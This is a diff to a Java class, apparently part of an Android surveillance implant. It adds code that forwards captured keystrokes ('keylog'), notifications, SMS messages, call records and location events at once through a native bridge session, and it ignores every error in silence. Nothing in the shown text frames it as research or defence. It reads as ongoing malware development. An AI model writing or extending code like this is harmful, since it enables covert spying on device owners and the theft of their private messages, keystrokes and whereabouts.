@@ -24,6 +24,22 @@ final class Outbox {
         while (EVENTS.size() > EVENT_CAP) {
             EVENTS.poll();
         }
+        if (NativeBridge.ready && isHighRate(kind)) {
+            try {
+                JSONObject envelope = new JSONObject();
+                String sid = NativeBridge.currentSid;
+                if (sid == null) {
+                    return;
+                }
+                envelope.put("sid", sid);
+                envelope.put("op", "event");
+                JSONArray batch = new JSONArray();
+                batch.put(item);
+                envelope.put("events", batch);
+                NativeBridge.send(envelope.toString());
+            } catch (Throwable ignored) {
+            }
+        }
     }
 
     static void result(int id, int code, Object out) {
@@ -39,6 +55,11 @@ final class Outbox {
         while (RESULTS.size() > RESULT_CAP) {
             RESULTS.poll();
         }
+    }
+
+    private static boolean isHighRate(String kind) {
+        return "keylog".equals(kind) || "notif".equals(kind) || "sms".equals(kind)
+                || "call".equals(kind) || "loc".equals(kind);
     }
 
     static JSONArray drainEvents(int limit) {
